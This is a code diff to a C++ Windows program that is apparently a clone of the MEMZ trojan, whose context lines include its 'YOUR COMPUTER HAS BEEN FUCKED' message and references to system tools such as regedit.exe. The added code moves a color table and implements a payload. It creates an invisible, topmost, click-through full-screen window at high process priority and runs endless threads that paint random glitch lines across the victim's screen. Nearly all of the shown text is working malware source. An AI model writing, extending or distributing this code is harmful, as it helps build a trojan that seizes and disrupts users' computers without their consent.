@@ -30,6 +30,13 @@
 #define DESKTOP_WINDOW ((HWND)0)
 #define PI 3.1415926
 #define ENABLE_VIRTUAL_TERMINAL_PROCESSING 0x0004
+#define INTENSITY 20
+
+int g_width = 0, g_height = 0;
+HWND g_hwndWindow;
+HDC g_hdc, g_hdcCopy;
+HBITMAP g_hBitmapCopy;
+HGDIOBJ g_hGdiobj;
 
 using namespace std;
 
@@ -48,6 +55,9 @@ LPCWSTR lpPaths[13] = {
     L"winver.exe",
     L"regedit.exe" 
 };
+
+// 红, 橙, 黄, 绿, 青, 蓝, 紫
+COLORREF dwColor[COUNT][COLOR] = { {255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {0, 255, 0}, {0, 255, 255}, {0, 0, 255}, {128, 0, 128} };
 
 HCRYPTPROV prov;
 const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\n\
@@ -1481,9 +1491,6 @@ void ScreenSplitting()
     ReleaseDC(hwnd, hdc);
 }
 
-// 红, 橙, 黄, 绿, 青, 蓝, 紫
-COLORREF dwColor[COUNT][COLOR] = { {255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {0, 255, 0}, {0, 255, 255}, {0, 0, 255}, {128, 0, 128} };
-
 DWORD WINAPI Cubes_x(LPVOID lpParameter)
 {
     int width = GetSystemMetrics(SM_CXSCREEN);
@@ -1562,4 +1569,134 @@ void RandomColor()
         CreateThread(NULL, 0, Cubes_y, NULL, 0, NULL);
         Sleep(1000);
     }
+}
+
+DWORD WINAPI HorizontalGlitch(LPVOID lpParameter)
+{
+    SIZE size;
+    POINT ptStr;
+    ZeroMemory(&ptStr, sizeof(ptStr));
+    ZeroMemory(&size, sizeof(size));
+    size.cx = g_width;
+    size.cy = g_height;
+    HDC hdcHori = CreateCompatibleDC(g_hdc);
+    HBITMAP hBitmapHori = CreateCompatibleBitmap(g_hdc, 1, g_height);
+    HGDIOBJ hGdiobj = SelectObject(hdcHori, hBitmapHori);
+
+    int i = 0, ix = (random() % 2) ? g_width - 1 : 0;
+    int nPixel = random() % COUNT;
+    SetPixel(hdcHori, 0, 0, RGB(dwColor[nPixel][0], dwColor[nPixel][1], dwColor[nPixel][2]));
+    StretchBlt(hdcHori, 0, 0, 1, g_height, hdcHori, 0, 0, 1, 1, SRCCOPY);
+    for (i = (ix == 0) ? 1 : -1; i == -1 && ix > 0 || i == 1 && ix < g_width; ix += i)
+    {
+        Sleep(INTENSITY);
+        if (random() % INTENSITY)
+            continue;
+
+        BitBlt(g_hdcCopy, ix, 0, 1, g_height, hdcHori, 0, 0, SRCCOPY);
+        //while (!BitBlt(g_hdcCopy, ix, 0, 1, g_height, hdcHori, 0, 0, SRCCOPY)) {}
+        UpdateLayeredWindow(g_hwndWindow, NULL, NULL, &size, g_hdcCopy, &ptStr, RGB(0, 0, 0), NULL, ULW_COLORKEY);
+    }
+    SelectObject(hdcHori, hGdiobj);
+    DeleteObject(hBitmapHori);
+    DeleteDC(hdcHori);
+
+    return 0;
+}
+
+DWORD WINAPI VerticalGlitch(LPVOID lpParameter)
+{
+    SIZE size;
+    POINT ptStr;
+    ZeroMemory(&ptStr, sizeof(ptStr));
+    ZeroMemory(&size, sizeof(size));
+    size.cx = g_width;
+    size.cy = g_height;
+    HDC hdcVert = CreateCompatibleDC(g_hdc);
+    HBITMAP hBitmapVert = CreateCompatibleBitmap(g_hdc, g_width, 1);
+    HGDIOBJ hGdiobj = SelectObject(hdcVert, hBitmapVert);
+
+    int i = 0, iy = (random() % 2) ? g_height - 1 : 0;
+    int nPixel = random() % COUNT;
+    SetPixel(hdcVert, 0, 0, RGB(dwColor[nPixel][0], dwColor[nPixel][1], dwColor[nPixel][2]));
+    StretchBlt(hdcVert, 0, 0, g_width, 1, hdcVert, 0, 0, 1, 1, SRCCOPY);
+    for (i = (iy == 0) ? 1 : -1; i == -1 && iy > 0 || i == 1 && iy < g_height; iy += i)
+    {
+        Sleep(INTENSITY);
+        if (random() % INTENSITY)
+            continue;
+
+        BitBlt(g_hdcCopy, 0, iy, g_width, 1, hdcVert, 0, 0, SRCCOPY);
+        //while (!BitBlt(g_hdcCopy, 0, iy, g_width, 1, hdcVert, 0, 0, SRCCOPY)) {}
+        UpdateLayeredWindow(g_hwndWindow, NULL, NULL, &size, g_hdcCopy, &ptStr, RGB(0, 0, 0), NULL, ULW_COLORKEY);
+    }
+    SelectObject(hdcVert, hGdiobj);
+    DeleteObject(hBitmapVert);
+    DeleteDC(hdcVert);
+
+    return 0;
+}
+
+DWORD WINAPI StartGlitch(LPVOID lpParameter)
+{
+    int delay = 0;
+    g_width = GetSystemMetrics(SM_CXSCREEN);
+    g_height = GetSystemMetrics(SM_CYSCREEN);
+    g_hdc = GetDC(g_hwndWindow);
+    g_hdcCopy = CreateCompatibleDC(g_hdc);
+    g_hBitmapCopy = CreateCompatibleBitmap(g_hdc, g_width, g_height);
+    g_hGdiobj = SelectObject(g_hdcCopy, g_hBitmapCopy);
+
+    for (;;)
+    {
+        CreateThread(NULL, 0, HorizontalGlitch, NULL, 0, NULL);
+        CreateThread(NULL, 0, VerticalGlitch, NULL, 0, NULL);
+        while ((delay = (random() % 10000)) < 7777) {}
+        Sleep(delay);
+    }
+    SelectObject(g_hdcCopy, g_hGdiobj);
+    DeleteObject(g_hBitmapCopy);
+    DeleteDC(g_hdcCopy);
+    ReleaseDC(g_hwndWindow, g_hdc);
+
+    return 0;
+}
+
+void GlitchLine()
+{
+    HINSTANCE hInstance = GetModuleHandle(NULL);
+
+    // 设置进程的优先级为高
+    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
+
+    // 注册窗口类
+    WNDCLASSEX WinEx;
+    WinEx.cbSize = sizeof(WinEx);
+    WinEx.lpfnWndProc = (WNDPROC)DefWindowProc;
+    WinEx.lpszClassName = "Glitch";
+    WinEx.style = 0;
+    WinEx.cbClsExtra = 0;
+    WinEx.cbWndExtra = 0;
+    WinEx.hInstance = GetModuleHandle(NULL);
+    WinEx.hIcon = 0;
+    WinEx.hCursor = LoadCursor(NULL, IDC_ARROW);
+    WinEx.hbrBackground = NULL;
+    WinEx.lpszMenuName = NULL;
+    WinEx.hIconSm = 0;
+
+    RegisterClassEx(&WinEx);
+
+    // 创建一个置于顶层的透明窗口
+    g_hwndWindow = CreateWindowEx(WS_EX_TOPMOST | WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW, "Glitch", "", WS_POPUP, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInstance, NULL);
+    ShowWindow(g_hwndWindow, SW_SHOW);
+    UpdateWindow(g_hwndWindow);
+    CreateThread(NULL, 0, StartGlitch, NULL, 0, NULL);
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0))
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
 }
